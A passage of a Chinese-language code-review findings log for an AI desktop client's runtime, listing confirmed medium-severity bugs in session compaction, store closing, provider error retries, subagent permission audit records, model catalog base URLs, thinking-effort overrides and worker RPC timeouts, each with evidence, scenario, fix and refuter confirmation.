3) retention='active_turn' 的触发条件是 turn.toolResults.length > 0 || stopReason === 'toolUse'（agent-loop/index.ts:234-237），而每条消息在 message_end 时就落盘（agent-loop/index.ts:262），所以此刻分支末尾正是 toolResult 条目，绝不是那条被保留的 user 消息。
4) CLI 侧后果我也核实了：buildContextEntries 从 firstKeptEntryId 起纳入（session-manager.js:198-225），compaction 条目只产出 summary 一条消息（session-manager.js:185-187），于是上下文变成 [摘要, 那条 toolResult, 之后的行]；pi-ai 的 transformMessages 只为「孤儿 toolCall」补造结果，对「孤儿 toolResult」原样放行（node_modules/@earendil-works/pi-ai/dist/api/transform-messages.js:125-180），因此这条会直接送到 provider。

次要点也属实：store.ts:214 的锚点计算在 enqueue 之外同步进行，与写入不共用同一份快照。

之所以仍给 medium 而非 high：损害面限于「GUI 压缩过的会话再去 TUI 继续聊」，且 completed_turn（retained=0）不写锚点，语义安全。现有测试 sessionInterop.test.ts:185-208 是手工构造「retainedTail 恰好等于最后两条」的用例，按构造必过，所以这条一直没被测出来。
WAIVER(no): 无 — compaction.ts 顶部注释明确的设计取舍（『丢弃 assistant 消息连同其 toolCall 一起丢，避免孤儿 tool_use 到达 provider』）针对的是本 runtime 自己喂给 provider 的上下文组装，不是写给 CLI 的 compactionAnchor。topics/gui-tui-session-interop.md 的 I4 只声明『压缩双向可读』已完成，其验证用例（sessionInterop.test.ts『shows the CLI the tail a compaction retained』）只覆盖了纯文本两条消息的保留尾巴，未覆盖工具调用回合末尾压缩这一场景，文档中没有任何文字承认或豁免 compactionAnchor 按位置回退可能对齐到 toolResult 条目这一具体缺陷。

### [session-06] MEDIUM bug confirmed | P3-1 | /home/ai/code/ai-client/src/runtime/plugins/session/store.ts:508 | 任意一次写入失败后，close()/dispose() 永远以那个旧错误 reject
DESC: enqueue 用 this.tail 串行化并刻意保留失败态（这是「写失败后拒绝继续写」的实现方式），但 close() 里 await 的正是这条已 reject 的 tail。finally 回调会把锁删掉（资源确实释放了），随后 close() 仍然以原始的磁盘错误 reject，并被 this.closing 缓存，之后每次 close() 都 reject。bootstrap 的 dispose 把这个 rejection 一路抛出（错误路径与正常路径都在 finally 里 await session.close()），于是 worker 的 dispose 变成「永远失败」，Main 侧会把一次正常的关闭当成异常处理。session.test.ts 里这条被 afterEach 的 dispose().catch(() => {}) 吞掉，所以测试是绿的。
EVIDENCE:     this.closing ??= (async () => {
      await Promise.allSettled([this.navigationWork]);
      await this.tail.finally(() => this.io.unlink(this.lock));
    })();
// bootstrap.ts:467  try { await session?.close(); } finally { ... }
SCENARIO: 磁盘写满（appendFile 抛 ENOSPC）导致一次 appendMessage 失败 → 用户关闭这个会话 / 应用退出 → handle.dispose() 以 'disk full' reject，尽管锁与 IO 都已经清理干净 → WorkerManager 把这次 dispose 当成失败（retire/报错路径），用户看到一条与当前操作无关的报错；重试 dispose 仍然 reject（closing 已缓存）。
FIX: close() 里用 Promise.allSettled([this.tail]) 或 this.tail.catch(() => {}) 等待队列排空，再释放锁并正常 resolve；失败态仍由 enqueue 保留以拒绝后续写入即可。
REFUTER(CONFIRMED,medium): 整条链我一路追到了 Main，每一环都对得上。

1) enqueue（store.ts:264-271）把失败态留在 this.tail 上（this.tail = work.then(() => {})，work 失败则 tail 失败），这是刻意的「写失败后拒绝继续写」。
2) close()（store.ts:508-515）await 的正是这条已 reject 的 tail：.finally(cb) 会执行 unlink（锁确实释放了）但把原错误重新抛出，且结果被 this.closing 缓存，之后每次 close() 都返回同一个 rejected promise。
3) bootstrap.ts:459-470 的 dispose 在 try/finally 里 await session?.close()，finally 只保证后续清理跑完，rejection 照样冒出去；错误路径 bootstrap.ts:488 同理。
4) worker 侧 piWorkerRpcServer.ts:990-993 的 handleDispose 里 await this.runtime?.dispose() 抛出后，被 :444-445 的 catch 转成 respondError，且 this.runtime 没被置空、onDisposed 没被调用。
5) Main 侧 WorkerSlot.ts:366-393 把这个 rejected ACK 记进 disposeError，只有在「进程已干净退出、ACK 丢在半路」时才吞掉，其余一律 throw。

触发条件比原报告写的 ENOSPC 更容易达到：store.ts:245-249 的 session_size_limit（默认 32MB）就是在 enqueue 内部抛的，一旦撞上，这个 store 的 close() 就永久失败。另外我发现一个原报告没提的连带面：nativeWorkerRuntime.ts:608 的 reload 路径里 await handle.dispose() 未包 catch，而此前 this.handle 已被置为 null，dispose 一旦 reject，这个 worker slot 会停在「没有图也没有 handle」的状态。session.test.ts 的 afterEach 用 dispose().catch(() => {}) 吞掉了这类失败，所以测试全绿。
WAIVER(no): 无 — topics/p3-1-session-contracts.md 只写『任一写入失败后本实例拒绝继续写，必须关闭并重新打开』，这是对『继续写入应被拒绝』的设计声明，并未提及也未豁免『close() 自身会因为复用同一个已 reject 的 tail Promise 而永久 reject，导致 dispose 把一次正常关闭当成异常』这一具体实现缺陷；evidence/p3/completion/README.md 的『已知限制』同样没有提到这一点。

### [loop-model-04] MEDIUM bug confirmed | P4-4 | src/runtime/plugins/agent-loop/providerErrors.ts:176 | 缺少 API key 被当成可重试故障，用户要等满 43 秒才看到原因
DESC: `readProviderKey` 在 auth.json 里找不到该 provider 时返回 `''`（有意为之，见其函数注释）。pi-ai 的 openai-completions 适配器在 `streamSimple` 入口同步抛 `No API key for provider: <id>`（`api/openai-completions.js:32-38`），这属于流开始前的 setup 失败，于是走到本层分类。该消息不匹配任何 unauthorized 模式（模式要求出现 `invalid api key`/`unauthorized`/`authentication` 等），最终落到函数末尾的兜底 `PROVIDER_ERROR, retriable:true`，于是按 3s/10s/30s 重试三次才失败。
EVIDENCE: providerErrors.ts:158-176
  if (/invalid[ _]api[ _]key|api key not valid|unauthorized|authentication|permission denied/i.test(rawMessage)) { … }
  …
  return result('PROVIDER_ERROR', true);
catalog.ts:271  return typeof entry?.key === 'string' ? entry.key : '';
pi-ai openai-completions.js:37  throw new Error(`No API key for provider: ${provider}`);
SCENARIO: auth.json 缺 `gateway` 这一项（同步没跑完、或 Main 组装时凭据库被锁），用户发一条消息：界面转圈 43 秒（3+10+30），四次请求全部在本地就失败，然后才报 `PROVIDER_ERROR: No API key for provider: gateway`。
FIX: 在 unauthorized 模式里加上 `no api key|api key (is )?(missing|not set|required)`，或在 `TRANSIENT_RETRY_CODES` 之外先判定「本地配置问题」；另可在 `bindProvider` 时把 apiKey 为空的 provider 记进 `catalog.dropped`（reason: `no_api_key`），让它在版本戳/run 头里有据可查。
REFUTER(CONFIRMED,medium): 整条路径我都走通了。catalog.ts:269-272 缺项返回 ''；agent-loop/index.ts:213 `resolved.requestKey || undefined` → pi-agent-core agent-loop.js:191 `(await getApiKey()) || config.apiKey` → options.apiKey 为 undefined → pi-ai applyAuth（models.js:369）取 auth.apiKey，也就是 binding.ts:118 返回的 ''；随后适配器入口同步抛 `No API key for provider: X`（openai-completions.js:32-37 的 getClientApiKey，anthropic-messages.js:166-174 的 assertRequestAuth 同样文案）。该抛出被 lazyStream 压成 `reason:'error'` 事件（api/lazy.js:36-45），进入 providerErrors.ts：无 abort、无网络特征、无 status、不匹配 unauthorized/rate-limit/context/model/timeout/stream 任一模式（文本里既没有 'api key not valid' 也没有 'stream'），落到 176 行兜底 PROVIDER_ERROR/retriable=true；isTransientProviderRetryCode 放行，无响应头 → providerSetupRetryDelayMs 走 3s/10s/30s 三级，总计 43s。触发条件也现实：src/main/services/piModelConfig/index.ts:152-162 在凭据库读不出时 inheritedApiKey 传 ''。维持 medium。
WAIVER(no): 无 — 同属 P4-4/F4 范围，但 F4 决策文档与 README.md 的豁免文字都只针对「加密机现场复测」，从未提及"缺失 API key 被误判为可重试导致用户等待 43 秒才看到真实原因"这一具体行为。这是纯本地可复现的分类逻辑问题（readProviderKey 返回空字符串、pi-ai 抛出的错误消息未命中任何 unauthorized 模式），与是否在加密机上验证无关，文档中没有对此单独提及或接受。

### [loop-model-06] MEDIUM contract-gap confirmed | P0-5 | src/runtime/plugins/agent-loop/index.ts:184 | 子代理工具的审批活动被过滤掉，既不进时间线也不进 trace
DESC: 父循环是 `runtimePermissions.onActivity` 的唯一消费者，它用 `toolCalls`（只在父 Agent 的 `tool_execution_start` 上填充，index.ts:265）做过滤。子代理的工具调用走的是自己的 Agent，事件经 `SubagentRun.emit` → `SubagentPlugin.publish` → `subagent.activity` 通道，**从不进入父 Agent 的 subscribe**，因此其 toolCallId 永远不在 `toolCalls` 里。结果：子代理触发的每一次权限门（含 `policy` 自动放行）既不产生 `permission.activity` 事件，也不写 `permission_prompt/permission_decision` 的 trace 备注。`permissions/activity.ts` 自己的注释写着这一行「是任何地方唯一能证明这次调用被门过了、而不是根本没检查」的证据。`SubagentActivityPayload`（runtimeEvents.ts:824-863）里也没有 permission 类型可以替代。审批弹窗本身走 approval bridge，不受影响，所以症状是「弹过窗、但事后什么记录都没有」。
EVIDENCE: index.ts:181-187
    const unsubscribePermissions = this.ctx.get('runtimePermissions')?.onActivity((record) => {
      // Gates raised outside this run's tool calls (a probe, a stale session)
      // belong to no message on screen and no line in this trace.
      if (!toolCalls.has(record.request.toolCallId)) return;
      trace.note('note', { event: `permission_${record.phase}`, ...record });
SCENARIO: agent 模式 + ask 档，父模型委派一个会写文件的子代理。用户在弹窗里点「允许一次」→ 文件被写、子任务完成；会话时间线上没有任何权限行，trace 里也没有 permission_prompt / permission_decision，事后无法回答「这次写入是谁批的、按哪条规则放行的」。`subagentToolsPermissions.test.ts` 直接订阅 onActivity 断言，恰好绕过了这条投影，所以测试全绿。
FIX: 过滤条件改为「本 run 的父工具调用 **或** 已登记的委派调用」——权限插件的 `scopeToolCall` 已经按 delegationId 记录了归属，可以据此放行；并把 delegationId/agentName 带进 `permission.activity` 的 payload，让时间线能标注审批来源。
REFUTER(CONFIRMED,medium): 过滤确实会丢掉子代理的权限活动。index.ts:181-187 是 onActivity 的唯一生产消费者（全仓 grep 只剩 subagentToolsPermissions.test.ts 自己订阅）；toolCalls 只由父 Agent 的 tool_execution_start 填充（index.ts:265）；子代理在 subagent/run.ts:202 新建自己的 Agent 并自订阅（run.ts:227），事件经 publish 走 subagent.activity 通道，records.ts:312-370 的 activityForEvent 也确实没有 permission 类别；我还确认 permissions/index.ts:198-201 的 attribute 只往 request 上贴 delegation，不改写 toolCallId，所以子代理的 id 不可能落进父 run 的集合。因此 permission.activity 事件与 permission_prompt/permission_decision 两条 trace 备注对委派调用一律缺失，policy 自动放行更是全无痕迹。一处需要修正报告的措辞：弹过窗的情况下时间线并非完全空白——worker 的 permissionPrompt.ts:140 会发 `permission.requested`，chatSessions.ts:1055-1090 据此画出 permission_request 块。真正缺的是决策/审计那一行与 trace。据此仍判 medium。
WAIVER(no): 无 — 检索 D10（Subagent 拓扑与生命周期规则）、D14（权限与模式两根轴）、docs/plantree/plans/runtime-evolution/topics/p5-2-subagent-contracts.md、p5-2-subagent-research.md 及 evidence/p5-2/signoff.md，均未提及子代理触发的权限审批活动是否会投影进父会话的 permission.activity 事件或 trace。signoff.md 里 subagentToolsPermissions.test.ts 的测试范围描述为「七工具交集、gear 隔离、写锁、重试预算」，不含权限活动记录投影这一项。没有任何文档段落承认或豁免这一取证链路缺口。

### [loop-model-08] MEDIUM contract-gap confirmed | P5-5 | src/runtime/plugins/model-adapter/catalog.ts:186 | baseUrl 为空的 provider 照样绑定并进选择器，不留诊断
DESC: `parsePiCatalog` 在 provider 没写 `baseUrl` 时填 `''`，`buildModel` 把 `''` 原样交给 pi-ai（`model.baseUrl ?? provider.baseUrl`）。MC01 的口径是「认不出/用不了的 provider 必须留下诊断」，`dropped` 目前只覆盖 `unknown_api` 与 `no_usable_model`，没有「没有地址」这一类。`src/shared/modelBaseUrl.ts:71-76` 明确写了空的继承地址保持为空是有意的（「没有地址」和「错的地址」是两回事），但那一层的结论到了 runtime 这一层没有转成可见诊断。
EVIDENCE: catalog.ts:186  baseUrl: typeof provider.baseUrl === 'string' ? provider.baseUrl : '',
binding.ts:83   baseUrl: model.baseUrl ?? provider.baseUrl,
SCENARIO: 托管端下发一个 `credentials.baseUrl:'onboarding'` 的 provider，而本机登录态里 `inheritedBaseUrl` 为空（凭据库未解锁）→ 该 provider 的 baseUrl 推导结果为 `''` → 它照常出现在模型选择器里，选中后请求在 URL 解析阶段失败，报一条与配置无关的底层错误；`catalog.dropped` 为空，run 头里看不出问题在哪。
FIX: 在 `parsePiCatalog` 里把 baseUrl 为空的 provider 记成 `dropped: { reason:'no_base_url' }`（或至少作为诊断保留但不进 `list()`）。
REFUTER(CONFIRMED,medium): 核心断言成立：catalog.ts:186 把缺失 baseUrl 填成 ''，binding.ts:83 原样交给 pi-ai，CatalogDrop 只有 unknown_api / no_usable_model 两种 reason，空地址 provider 照样进 list() 且 dropped 为空；shared/modelBaseUrl.ts:71-76 确实有意让空继承地址保持为空。但失败现象写错了，而且真相更糟：空串不会在 URL 解析阶段报错——openai SDK（src/runtime/node_modules/openai/src/client.ts:426）是 `baseURL: baseURL || 'https://api.openai.com/v1'`，anthropic SDK（@anthropic-ai/sdk/client.js:57）是 `baseURL || 'https://api.anthropic.com'`，空串走的是厂商公网默认端点。配合 configValidation.ts:74-80 允许 `credentials:{baseUrl:'onboarding', apiKey:'managed'}` 这种组合，一个自带管理员密钥、地址靠继承的 provider 在凭据库读不出时（index.ts:152 传空 inheritedBaseUrl）会拿着管理员的 key 直连 api.openai.com/api.anthropic.com，而不是报配置错误。因此我把严重级从 low 提到 medium。
WAIVER(no): 无 — src/shared/modelBaseUrl.ts:71-76 的注释确实说明"继承地址为空时保持为空是有意的，是为了让缺失配置可被诊断，而不是拼出一个能悄悄发到相对路径的错误地址"，这是对 baseUrl 推导规则本身（空值不瞎补全）的取舍说明。但发现指出的问题是下一层的诊断缺失：CatalogDrop 的 reason 字段类型只有 unknown_api 和 no_usable_model 两种（src/runtime/plugins/model-adapter/catalog.ts:113），没有"provider 存在但 baseUrl 为空"这一类，导致这种 provider 照常进入模型选择器且不会出现在 catalog.dropped 里。evidence/p5-4-p5-5/README.md 里对 dropped 机制的描述也只覆盖"认不出的 provider"，未提及空地址场景。这条诊断缺口没有被任何文档明确接受或推迟。

### [worker-runtime-02] MEDIUM bug confirmed | P4-4 | src/runtime/worker/nativeUtility.ts:104 | 一次性补全里显式的 effort='off' 会被 agent 目录里钉的思考档位覆盖
DESC: requestEffort 只认六档（不含 'off'），所以显式传 'off' 会返回 undefined，再被 ?? 接到 configuredEffort()，于是去读 <agentDir>/settings.json 的 modelThinkingLevels/defaultThinkingLevel，把用户明确关掉的思考档位换成文件里钉的档位（例如 high）。被删掉的旧实现是先 requested ?? modelLevel ?? default，最后统一把 'off' 映射成 undefined（HEAD:src/agent-host/piUtilityRunner.ts:52-63），显式 off 从不落到配置值上；旧测试里 'omits the field for off rather than substituting a level' 这条断言随文件一并删除，新测试没有等价用例。'off' 在 SESSION_EFFORT_LEVELS 中是合法值（src/shared/types/agentHost.ts:18-26），并且 Main 的 IPC 用 isSessionEffortLevel 原样放行（src/main/ipc/git.ts:372）。
EVIDENCE: const effort =
  requestEffort(input.effort) ?? (await this.configuredEffort(runtime, ref.provider, ref.id));
void this.run(active, resolved, effort);
SCENARIO: 用户在 AI 功能（生成提交信息/分支名/代码评审）里把思考档位选成 off，且 <agentDir>/settings.json 里存在 modelThinkingLevels['provider/model']='high'（该文件由随包 pi CLI 写）→ utility.start 带 effort:'off' → 请求实际带 reasoning:'high'，用户关掉的推理照样按高档计费与延迟。
FIX: 把 'off' 与 undefined 区分开：input.effort === 'off' 时直接返回 undefined 且不再读配置，只有 input.effort 缺省时才回落到 configuredEffort。
REFUTER(CONFIRMED,medium): 代码与断言完全对得上，推翻不了。REQUEST_EFFORTS 只有六档、不含 'off'（nativeUtility.ts:44-50），所以 requestEffort('off') 返回 undefined，104-105 行的 ?? 接着去读 <agentDir>/settings.json 的 modelThinkingLevels/defaultThinkingLevel（configuredEffort，196-222 行），把用户显式关掉的推理换成文件里钉的档位，再原样放进 streamSimple 的 reasoning（240 行）。这与同一文件 36-43 行自己写的「不能把用户没选过的档位放上线」正好相反。被删的旧实现是 requested ?? modelLevel ?? default 之后统一把 'off' 映射成 undefined（HEAD:src/agent-host/piUtilityRunner.ts:52-63），显式 off 绝不会落到配置值上；旧断言 'omits the field for off rather than substituting a level'（HEAD:src/agent-host/__tests__/piUtilityRunner.test.ts:163）随文件删除，新测试只有「目录钉的档位生效」和「显式 minimal 覆盖目录」两条，没有 off 的等价用例。

唯一能替这条辩护的是触发面窄：UI 侧 effortsForModel 只在模型 metadata 的 thinkingLevelMap 明确声明 'off' 时才把 Off 选项放出来（efforts.ts:166-176，注释还说本仓真实目录条目多为 reasoning:true 且无 map），且需要 <agentDir>/settings.json 里有 pi TUI 写下的 thinking 档位。但 IPC 边界（src/main/ipc/git.ts:372/401/513 的 isSessionEffortLevel）对 'off' 原样放行，档位也确实在 SESSION_EFFORT_LEVELS 里，所以窄不等于不可达。维持 medium。
WAIVER(no): 无 — 该发现指工具调用里显式传入的思考档位 'off' 会被 <agentDir>/settings.json 里钉的档位覆盖，是重构中丢失了旧实现 'off 从不落到配置值上' 这条逻辑与对应测试。P4-4 节点仅有的豁免文本是「F4 重试现场单列」（README.md P4 表 P4-4 行），F4 明确指向 503 不重试直接失败（docs/plans/2026-09-09-gui-defect-decisions.md F4 段），与思考档位覆盖无关。全文检索未发现任何决策、topics 或 evidence 文档提及 effort/thinking level 的显式覆盖行为，不构成文档取舍。

### [worker-runtime-05] MEDIUM contract-gap confirmed | P4-3 | src/runtime/worker/nativeWorkerRuntime.ts:611 | worker.reload 重建整张插件图（含 MCP 握手）却只有 Main 的 10s 常规预算，bootstrap 同样的活给了 60s
DESC: reload 的实现是拆掉旧图再 openGraph 重建一张完全相同的图；bootstrap.ts 在建图时会 await connectMcpServers（src/runtime/bootstrap.ts:266-273，注释明说 MCP 服务器是外部进程、要等握手），还要做 skills 发现与 subagent 目录加载。Main 侧 worker.bootstrap 被单独给了 BOOTSTRAP_REQUEST_TIMEOUT_MS = 60_000，注释写明「10s 截断会让健康会话打不开」（src/main/services/agent-host/createPiWorkerSlot.ts:52-57,114）；而 reloadSession 调 slot.request('worker.reload', ...) 不传 timeoutMs（src/main/services/agent-host/WorkerManager.ts:1364-1367），落到 WorkerSlot 的 DEFAULT_REQUEST_TIMEOUT_MS = 10_000。同一份工作两套预算，reload 这边是短的那套。
EVIDENCE:     try {
      await this.openGraph(agentDir, { file: current, cwd: this.cwd, mode: 'resume' });
    } catch (error) {
SCENARIO: 用户配了一两个 stdio MCP 服务器，在 pi TUI 里编辑完会话交还 GUI，CHAT_SEND 触发 worker.reload → 重建图等 MCP 握手超过 10s → Main 以 WORKER_RPC_TIMEOUT 失败，catch 里 retireAndDispose 整个槽（WorkerManager.ts:1411-1415），而此时 worker 的 RPC 链还被 reload 占着，worker.dispose 也要排队到 3s 超时后被强杀 → 用户这条消息失败，会话冷启重开。
FIX: 给 worker.reload 传与 bootstrap 同量级的 timeoutMs（复用 BOOTSTRAP_REQUEST_TIMEOUT_MS），或者让 reload 不整图重建（只重开 session store）。
REFUTER(CONFIRMED,medium): 核实后不但没推翻，还更硬了。reload 走的就是和 bootstrap 同一个 openGraph（nativeWorkerRuntime.ts:611、173-266），建图时一定会 await connectMcpServers（bootstrap.ts:265-273），而 MCP 自己的握手预算是 MCP_CONNECT_TIMEOUT_MS = 30_000（plugins/mcp/index.ts:53,143），且多台服务器是 Promise.all 并行、取最慢那台——也就是 runtime 内部允许一次建图花到 30s。Main 这边 reloadSession 调 slot.request('worker.reload', ...) 不传 timeoutMs（WorkerManager.ts:1364-1367），WorkerManager 全文没有任何一处传过 timeoutMs，于是落到 WorkerSlot 的 DEFAULT_REQUEST_TIMEOUT_MS = 10_000（WorkerSlot.ts:92,411）；同一份活的 bootstrap 侧则是 BOOTSTRAP_REQUEST_TIMEOUT_MS = 60_000（createPiWorkerSlot.ts:57,114），注释明写 10s 会误杀健康会话。后果链也成立：CHAT_SEND 在释放 TUI 后直接 await reloadSessionFromDisk 且不 catch（src/main/ipc/chat.ts:493-497），reload 失败 → WorkerManager.ts:1408-1417 retireAndDispose → 用户这条消息报错、会话冷启；worker 侧 dispose 还得排在被 reload 占住的同一条序列化 chain 后面（piWorkerRpcServer.ts:307,339-341，worker.dispose 也在同一个 switch 里），确实要等 disposeTimeoutMs=3s 超时后强杀（WorkerSlot.ts:93,365-383）。
WAIVER(no): 无 — 该发现指 worker.reload 重建整张插件图（含 MCP 握手）却只有 Main 默认 10s 超时，而 bootstrap 同样的工作有 60s 预算。P4-3（WorkerTransport）在 README.md P4 表中仅标 ✅，无附注；P5-1/P5-3 中关于 MCP 的豁免（如“未接过真实第三方 MCP 服务器”“resources/prompts/sampling/roots/HTTP-SSE 未实现”）针对的是协议能力范围与真机联调覆盖度，不是 reload 与 bootstrap 两条路径超时预算不一致这一具体代码缺陷。未见任何文档提及此不对称超时问题，不构成豁免。

### [worker-runtime-06] MEDIUM bug confirmed | P4-4 | src/runtime/worker/nativeWorkerRuntime.ts:480 | worker.compact 在序列化 RPC 链里等一次完整 provider 调用，UI 报失败但摘要照样落盘
DESC: compact 直接 await context.prepareTurn({force:true})，即当场发一次摘要模型请求，整个过程占着 PiWorkerRpcServer 的序列化 chain（startSend 特意不这么做，注释在 353-356 行写明原因）。Main 侧 compactSession 同样不传 timeoutMs，用 10s 默认值。超时只是 reject 挂起的请求、不动 worker（WorkerSlot.ts:423-434），于是 worker 会继续把 compaction 条目写进 JSONL：界面报「压缩失败」，磁盘上却成功了，下一次 reload/resume 又冒出一条用户以为没发生的压缩；同时排在 compact 后面的 worker.stop / worker.history / worker.dispose 也一起被链阻塞至各自超时。端到端测试用 faux provider 瞬时返回，覆盖不到这个时间维度。
EVIDENCE:     context.beginRun(snapshot);
    const prepared = await context.prepareTurn({
      messages: snapshot.messages,
      model: resolved.model,
      models: resolved.models,
      retention: 'completed_turn',
      force: true,
SCENARIO: 在一段长对话上点 /compact，摘要请求耗时 15s → Main 10s 超时抛 worker_compact_failed，用户看到失败提示；worker 5s 后把 compaction 写入会话文件，后续这条会话的上下文已被压缩，与界面的「失败」结论矛盾。
FIX: 给 worker.compact 传与模型调用相称的超时（或与 send 一样改成先应答后台执行 + 事件汇报终态），并在超时路径上明确压缩结果的归属。
REFUTER(CONFIRMED,medium): 推翻不了。compact 确实在序列化 chain 里当场 await 一次完整的摘要模型调用：nativeWorkerRuntime.ts:474-487 调 context.prepareTurn({force:true})，force 直接进 compactNow（context/index.ts:222-239），compactNow 走 summarize → compact()（318-340 行）发真实请求，成功后立刻 session.appendCompaction 落盘再返回（301-303 行）。关键补充：compact() 这个 RPC 全程没有传 signal（prepareTurn 的入参里没有 signal 一项），而 prepareTurn/summarize 是支持 signal 的——所以 Main 超时后没有任何东西会中止这次摘要。Main 侧 compactSession 同样不传 timeoutMs（WorkerManager.ts:1186-1192），落 10s 默认值；WorkerSlot 的超时只是 reject 挂起的 promise、既不杀 worker 也不改槽位状态（WorkerSlot.ts:423-435），所以「界面报失败 / 磁盘已压缩」的分叉是真的。链阻塞也属实：worker.stop / worker.history / worker.dispose 都在同一个 switch 里排队（piWorkerRpcServer.ts:339-341,404-423）。

唯一能给它减分的是这不是 P4 引入的新问题——被删的 legacy 实现同样在 chain 里 await session.compact(instructions)（HEAD:src/agent-host/piWorkerSession.ts:426-443），两个后端同病。但同病不等于不是缺陷，维持 medium。
WAIVER(no): 无 — 该发现指 worker.compact 在序列化 RPC 链里同步等待一次完整 provider 摘要请求，Main 侧仍用 10s 默认超时，超时后 UI 报失败但摘要已写入 JSONL，造成状态不一致。P1-9 的豁免（“压缩记录只存在于内存，跨 run/resume 的持久化…本服务只是产出字段”）讨论的是压缩记录跨会话持久化机制的归属（该题后来在 P2-4/P3 已经解决），与此处“RPC 超时和磁盘落盘结果不一致”这一具体的时序/错误处理缺陷完全是两回事。F4（503 不重试）与此也无关。未发现相关豁免文本。

### [worker-runtime-12] MEDIUM test-gap confirmed | P4-4 | src/runtime/__tests__/workerEndToEnd.test.ts:455 | fork 的「丢弃自有会话文件」分支、reload/dispose 的失败路径均无测试
DESC: 端到端用例只覆盖了 discardFork 的 staged 分支和「不是我们做的 fork」分支，owned 分支（worker 自己持有的文件）一条用例都没有——正是 worker-runtime-01 恒失败的那条。同样没有覆盖：reload 中旧图 dispose 失败（worker-runtime-03）、dispose 中 handle.dispose 抛错（worker-runtime-07）、bootstrap 在建图之后失败的重试（worker-runtime-08）。nativeWorkerRuntime.test.ts 的假 handle 的 dispose 永远成功，结构上无法触发这些分支。
EVIDENCE:     // A file this worker never staged is not ours to delete.
    expect(
      await call('worker.fork.discard', {
        logicalSessionId: 'logical-e2e',
        sessionFile: join(workspace, 'not-a-fork.jsonl'),
      })
    ).toEqual({ discarded: false });
SCENARIO: 回归时改动 dispose 顺序或 io 生命周期，上述四条路径任何一条继续坏掉，现有测试全绿也发现不了。
FIX: 给 nativeWorkerRuntime.test.ts 加三条：假 handle 的 dispose reject 时 reload/dispose 的状态断言；端到端加一条「丢弃 worker 自己打开的会话文件」并断言文件确实消失。
REFUTER(CONFIRMED,medium): 覆盖缺口逐条核实成立，而且我补到的证据说明它比原报告标的更值钱，所以我把级别从 low 提到 medium。覆盖现状：src/runtime 下 worker.fork.discard 只有 workerEndToEnd.test.ts:492（staged 分支，断言文件被删）与 :501（非本 worker 暂存，返回 discarded:false）两条，owned 分支无任何用例；nativeWorkerRuntime.test.ts 的假 handle（139-141 行 dispose: async () => { fake.disposed += 1 }）永远 resolve，所以 reload 里 608 行未加保护的 await handle.dispose() 与 dispose 里 784 行的 await handle?.dispose() 的失败路径都没人测（严格说并非「结构上不可能」——用例可以覆写 fake.handle.dispose——但现存用例确实没有）；'does not cache a failed bootstrap'（238-255）让 create 在第一次就抛错，失败发生在建图之前，建图之后再失败的重试/泄漏路径同样没有覆盖。加重理由：owned 分支在生产可达且必然失败——WorkerManager.ts:1601 在 fork 收编失败回滚时，正是对持有该文件的 target 槽发 discard；而 discardFork（nativeWorkerRuntime.ts:693-697）先 await this.dispose()，dispose 链里 bootstrap.ts:470 调 runtimeIo.shutdown()，HostIoPlugin.track（src/runtime/host/io.ts:53-55）此后对任何调用直接 reject('runtime_disposed')，catch 只吞 ENOENT，于是 unlink 必抛。也就是说这条没被测到的分支，今天就是坏的。瑕疵：file:line 锚点 455 指到的是 rewind 用例，引用的代码实际在 499-505，属于行号漂移，不影响结论。
WAIVER(no): 无 — 检索 P4-4 相关记录（README.md P4-4 行、history/2026-09-10-status-before-consolidation.md 的 P4-4 端到端条目）只提到『端到端 11 项用真实 PiWorkerRpcServer...』这类概述，未逐分支列出 discardFork 的 owned 分支、reload 中 dispose 失败、dispose 中 handle.dispose 抛错、bootstrap 建图后失败重试这几条具体路径是否被覆盖，更没有明确将它们标注为『已知未覆盖、可接受』。这是纯粹的测试覆盖缺口发现，文档中没有相应的豁免条目。

### [rpc-projector-02] MEDIUM contract-gap confirmed-partial-waiver | P4-5 | src/runtime/events/projector.ts:99 | 重试横幅在 native 后端彻底没有生产者（旧引擎有，属 D5 事件集合回退）
DESC: 渲染层有一整套「正在重试」横幅：`SessionStatusEvent.payload.retry`（runtimeEvents.ts:188）→ chatSessions.ts:828 存进 session.retry → retryBanner.ts:71-89 画出 attempt/maxRetries/delayMs/error。旧引擎 piWorkerSession 把 pi SDK 的 auto_retry_start / auto_retry_end 投影成带 retry 的 session.status（可在 `git show HEAD:src/agent-host/piWorkerSession.ts` 第 1204-1232 行看到）。自有 runtime 这一侧：projector 只发 status:'running'/'idle'（99-105、345-349），nativeWorkerRuntime 只多一个 'stopping'（416），agent-loop 只在失败时补一个 idle（94）。而重试逻辑确实存在——providerRetry.ts 的 `onRetry` 回调只写进 trace（agent-loop/index.ts:192-199），一个字都不上 wire。全仓 grep `retry:` 在 src/runtime 下除了 providerRetry 内部变量外没有任何事件发射点。
EVIDENCE: // projector.ts start()
this.emit({ type: 'session.status', sessionId: this.sink.sessionId, payload: { status: 'running' } });
// agent-loop/index.ts:191-199 —— 重试只进 trace，不进事件
const retryBudget = createProviderRetryBudget({
  onRetry: ({ error, attempt, delayMs }) =>
    trace.note('note', { event: 'provider_retry', code: error.code, attempt, delay_ms: delayMs, ... }),
SCENARIO: provider 返回 429。providerRetry.ts:52 的阶梯是 3s / 10s / 30s，最多 3 次（PROVIDER_RATE_LIMIT_MAX_RETRIES），限流与 setup 两类错误各有一份预算。用户点发送后，界面停在 status:'running'，最长约 43 秒（两类叠加可到 ~86 秒）完全没有任何提示——既没有横幅，也没有状态变化，也没有 stderr 行。同样的场景在旧引擎上会显示「重试 1/3，3 秒后，rate limited」。
FIX: 把 providerRetry 的 onRetry/重试成功两个时刻接到 runtimeEvents 上，发 session.status + SessionRetryInfo（字段名沿用 attempt/maxRetries/delayMs/error/errorStatus），并在 guiEventContract 里录一条带重试的流。
REFUTER(CONFIRMED,medium): 「native 侧没有任何 retry 事件生产者」这一条属实，我按三个方向都没找到反例。(1) `grep -rn retry src/runtime --include=*.ts -l`（排除 node_modules/测试）只命中 providerRetry.ts / providerErrors.ts / index.ts / tools / subagent / contracts / nativeWorkerRuntime / nativeImport，其中 nativeWorkerRuntime 的命中全是 NativeWorkerRuntimeError 的 `retryable` 字段，contracts 的是注释，没有一处 emit 带 retry 的 session.status。(2) agent-loop/index.ts:191-200 的 onRetry 确实只调 trace.note；trace.ts:91-98 的 note 只是 push 进 steps 数组，finish 时落盘成 trace 文件，全程不碰 runtimeEvents——「重试只进 trace 不上 wire」经核实成立。(3) 消费端仍在：runtimeEvents.ts:188 的 `retry?: SessionRetryInfo`、chatSessions.ts:823-829 把 payload.retry 存进 session、retryBanner.ts:71-108 画横幅、MessageTimeline.tsx:1385-1392 调 